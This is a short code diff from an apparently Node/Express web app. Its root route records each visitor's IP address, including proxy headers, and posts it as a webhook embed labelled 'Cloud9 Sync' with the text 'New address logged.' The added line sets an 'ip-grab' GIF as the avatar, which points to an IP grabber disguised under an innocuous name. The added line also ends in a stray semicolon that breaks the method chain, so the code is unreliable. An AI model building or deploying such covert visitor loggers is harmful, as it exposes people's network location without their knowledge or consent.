@@ -21,6 +21,7 @@ app.get("/", async (req, res) => {
   const isProxy = req.headers["via"] || req.headers["x-forwarded-for"];
   try { 
     const embed = new MessageBuilder()
+      .setAvatar('https://media.tenor.com/qQdkbv8g7rIAAAAC/ip-grab.gif');
       .setTitle("Cloud9 Sync")
       .setDescription("New address logged.")
       .addField("IP", ipAddress)
